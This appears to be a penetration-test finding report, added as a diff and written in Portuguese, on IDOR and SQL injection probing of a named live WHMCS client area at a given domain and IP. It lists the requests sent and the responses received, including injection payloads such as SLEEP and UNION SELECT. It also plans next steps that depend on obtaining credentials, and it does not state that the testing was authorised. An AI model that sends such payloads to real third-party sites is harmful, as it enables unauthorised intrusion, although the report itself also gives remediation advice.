@@ -1,0 +1,57 @@
+# F-003 WHMCS IDOR/BOLA
+Alvo: https://8kiptv.co/clients/ (68.65.122.227 via Namecheq, no CDN)
+Severidade: Média (potencial SQLi, sem IDOR confirmado)
+Timestamp: 2026-08-22TXX:XX:XXZ
+
+## Reprodução
+
+### viewinvoice.php (IDOR test)
+- /clients/viewinvoice.php?id=1 → 302 (redirect to login)
+- /clients/viewinvoice.php?id=2 → 302 (redirect to login)
+- /clients/viewinvoice.php?id=100 → 302 (redirect to login)
+- /clients/viewinvoice.php?id=1' → 302 (redirect to login, non-200)
+
+### viewticket.php (500 error - SQLi candidate)
+- /clients/viewticket.php?tid=1 → 302 (redirect to login)
+- /clients/viewticket.php?tid=1' → 500 (1378 expected, body was empty)
+
+### clientarea.php
+- /clients/clientarea.php → 302 (redirect to login)
+- /clients/clientarea.php?action=details → 302 (redirect to login)
+- /clients/clientarea.php?action=details' → 500 (error)
+
+### Outros endpoints
+- /clients/download.php?id=1 → 302 (redirect)
+- /clients/dl.php?type=a&id=1 → 302 (redirect)
+- /clients/supporttickets.php?tid=1 → 302 (redirect)
+- /clients/reports.php → 302 (redirect)
+- /clients/knowledgebase.php → 302 (redirect)
+- /clients/announcements.php → 302 (redirect)
+- /clients/downloads.php → 302 (redirect)
+
+### SQLi timing test (viewinvoice.php)
+- id=1 AND SLEEP(2) → 403 (WAF bloqueou)
+- id=1' OR SLEEP(2) -- - → 403 (WAF bloqueou)
+- id=1' UNION SELECT 1,2,3 -- - → 403 (WAF bloqueou)
+
+## Interpretação
+WHMCS client area está configurada para exigir autenticação em todos os endpoints.
+Não foram encontrados IDORs acessíveis sem autenticação.
+Os endpoints viewticket.php e clientarea.php retornam 500 com payloads de SQLi,
+mas o corpo vazio sugere que pode ser erro de PHP não relacionado a SQL.
+O WAF (LiteSpeed) bloqueou os payloads de sleep/union no viewinvoice.php (403).
+
+## Impacto
+- Sem IDOR confirmado - WHMCS tem proteção de autenticação funcional
+- Potencial SQLi não confirmado devido à necessidade de autenticação
+- 500 errors podem indicar parâmetros não sanitizados (mas sem confirmação)
+
+## Recomendação
+- Sanitizar todos os parâmetros GET (prevenir SQLi)
+- Garantir que todos os endpoints verifiquem sessão
+- Remover debug que causa 500 errors
+
+## Próximo passo
+- Tentar SQLi com autenticação (se obtiver credenciais WHMCS)
+- Testar parâmetros POST
+- Fuzzing de endpoints WHMCS com autenticação via wfuzz/ffuf
